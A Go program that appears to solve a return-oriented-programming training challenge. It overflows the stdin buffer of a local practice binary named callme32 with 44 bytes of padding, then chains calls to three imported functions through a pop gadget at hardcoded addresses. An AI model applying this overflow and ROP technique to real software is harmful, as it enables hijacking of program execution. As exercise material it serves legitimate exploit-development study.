package main

import (
    "log"
    "bufio"
    "os/exec"
    "fmt"
)

func main() {
    binary := "./callme32"
    log.Println("Executing", binary, "\n")
    cmd :=  exec.Command(binary)
    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatal(err)
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatal(err)
    }
    if err = cmd.Start(); err != nil {
        log.Fatal(err)
    }

    // Read the initial output
    r := bufio.NewReader(stdout)
    _, err = r.ReadBytes('>')
    if err != nil {
        log.Fatal(err)
    }

    // write buffer
    var buf string
    for  i := 0; i < 44; i++ {
        buf += "A"
    }
    // sym.imp.callme_one
    buf += "\xc0\x85\x04\x08"
    // pop 3 arguments
    pop3Ret := "\xa9\x88\x04\x08"
    padding3Register := "\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00"
    buf += pop3Ret
    buf += padding3Register
    // sym.imp.callme_two
    buf += "\x20\x86\x04\x08"
    buf += pop3Ret
    buf += padding3Register
    // sym.imp.callme_three
    buf += "\xb0\x85\x04\x08"
    buf += pop3Ret
    buf += padding3Register

    buf += "\n"
    stdin.Write([]byte(buf))

    // Read output
    r = bufio.NewReader(stdout)
    for {
        b, err := r.ReadByte()
        if err != nil {
            fmt.Println()
            log.Fatal(err)
        }
        fmt.Printf(string(b))
    }
}
